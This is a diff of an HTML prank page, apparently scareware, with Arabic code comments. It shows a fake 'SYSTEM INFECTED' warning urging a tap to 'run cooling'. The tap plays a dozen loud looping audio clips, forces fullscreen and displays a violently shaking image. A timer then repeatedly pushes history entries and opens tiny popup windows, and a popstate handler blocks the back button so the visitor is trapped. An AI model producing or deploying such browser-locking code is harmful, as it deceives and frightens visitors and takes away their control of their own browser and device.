@@ -3,73 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_LOCK_ACTIVE ⚠️</title>
+    <title>⚠️ WARNING: SYSTEM LOCK ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
         
-        /* الصورة واضحة تماماً وبلا أي فلاتر رمادية سواسوة */
+        /* الصورة واضحة، مصغرة شوية (85%)، وتتحرك بجنون سواسوة */
         #stalkerEntity { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            object-fit: cover; z-index: 1; display: none;
-            /* الصورة تظهر بألوانها الأصلية سواسوة */
+            width: 85%; /* صغرناها شوية كما قلت سواسوة */
+            height: auto;
+            max-height: 85vh;
+            object-fit: contain;
+            z-index: 1;
+            display: none;
+            will-change: transform;
         }
 
-        #ui { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #f00; }
+        #ui { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.9); padding: 25px; border: 3px solid #f00; box-shadow: 0 0 20px #f00; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
-        button { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.3em; margin-top: 15px; box-shadow: 0 0 10px #f00; }
+        button { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.4em; margin-top: 20px; }
     </style>
 </head>
-<body onclick="activateJail()">
+<body onclick="startTheMadness()">
 
     <div id="ui">
-        <h1 class="blink">☠️ SECURITY ALERT ☠️</h1>
-        <p>Unauthorized access detected.<br>Click to verify identity.</p>
-        <button>VERIFY</button>
+        <h1 class="blink">☠️ SYSTEM INFECTED ☠️</h1>
+        <p>Your hardware is being stressed.<br>Tap to initiate cooling sequence.</p>
+        <button>RUN COOLING</button>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="horrorSounds">
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
+    <div id="audios">
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
     </div>
 
     <script>
-        function activateJail() {
-            // 1. تشغيل الأصوات كاملة في الخلفية سواسوة
-            document.querySelectorAll('.s').forEach(a => { 
-                a.volume = 1.0; 
-                a.play(); 
-                a.addEventListener('ended', function() { this.currentTime = 0; this.play(); }); 
-            });
+        let aCtx, analyser, dArray;
+        const img = document.getElementById('stalkerEntity');
+
+        function startTheMadness() {
+            // 1. تشغيل الأصوات كاملة سواسوة
+            document.querySelectorAll('.h').forEach(a => { a.volume = 1.0; a.play(); });
 
             document.getElementById('ui').style.display = 'none';
-            document.getElementById('stalkerEntity').style.display = 'block';
+            img.style.display = 'block';
             document.documentElement.requestFullscreen();
 
-            // 2. نظام "الحبس": منع الرجوع وتثبيت الصفحة سواسوة
+            // 2. نظام الحبس المريغل (يمنع الخروج ويخلق لاق سواسوة)
             setInterval(() => {
-                // منع زر الرجوع عبر إضافة حالات وهمية للتاريخ سواسوة
                 history.pushState(null, null, window.location.href);
-                // فتح نوافذ منبثقة لتبليك الخروج سواسوة
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 200); 
+            }, 180); // سرعة أكبر للحبس سواسوة
+
+            setupReactiveMadness();
         }
 
-        // إجبار المتصفح على البقاء في الصفحة سواسوة
         window.onpopstate = () => history.go(1);
-        window.onbeforeunload = () => { return "Are you sure you want to leave?"; };
+
+        function setupReactiveMadness() {
+            aCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const src = aCtx.createMediaElementSource(document.querySelector('.h'));
+            analyser = aCtx.createAnalyser();
+            analyser.fftSize = 128;
+            dArray = new Uint8Array(analyser.frequencyBinCount);
+            src.connect(analyser);
+            analyser.connect(aCtx.destination);
+            requestAnimationFrame(animateMadly);
+        }
+
+        function animateMadly() {
+            analyser.getByteFrequencyData(dArray);
+            let sum = 0;
+            for(let i=0; i<dArray.length; i++) sum += dArray[i];
+            let avg = sum / dArray.length;
+
+            // 3. ميزة "المجنونة": اهتزاز عشوائي مع قوة الصوت سواسوة
+            const intensity = (avg / 255) * 50; 
+            const rot = (Math.random() - 0.5) * intensity;
+            const tx = (Math.random() - 0.5) * intensity * 2;
+            const ty = (Math.random() - 0.5) * intensity * 2;
+
+            img.style.transform = `translate(${tx}px, ${ty}px) rotate(${rot}deg) scale(${1 + (avg/255)*0.2})`;
+            
+            requestAnimationFrame(animateMadly);
+        }
     </script>
 </body>
 </html>
